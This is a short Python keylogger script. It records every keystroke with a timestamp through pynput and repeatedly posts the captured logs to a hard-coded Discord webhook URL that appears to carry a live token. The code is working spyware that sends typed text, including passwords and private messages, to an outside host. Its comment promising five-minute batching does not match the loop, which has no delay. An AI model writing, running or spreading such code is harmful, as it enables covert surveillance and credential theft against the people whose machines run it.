import os
import time
import requests
from pynput import keyboard

# Discord webhook URL
discord_webhook_url = "https://discord.com/api/webhooks/1186985816254316574/pEkFuwOfHZ_cKTFglI8QXZLedEfwaF9FleoiagqpKVTvqxyg7myl3lQu2apzO7sdHp8h"

# Keystroke logs
keystrokes = []

# Function to send logs to Discord webhook
def send_logs():
    global keystrokes
    if keystrokes:
        logs = "\n".join(keystrokes)
        requests.post(discord_webhook_url, data={'content': logs})
        keystrokes = []

# Function to log pressed keys
def on_press(key):
    try:
        keystrokes.append(f'Key {key.char} pressed at {time.ctime()}')
    except AttributeError:
        keystrokes.append(f'Special key {key} pressed at {time.ctime()}')

# Start keylogger
with keyboard.Listener(on_press=on_press) as listener:
    try:
        while True:
                  # Log every 5 minutes
            send_logs()
    except KeyboardInterrupt:
        send_logs()
        listener.stop()

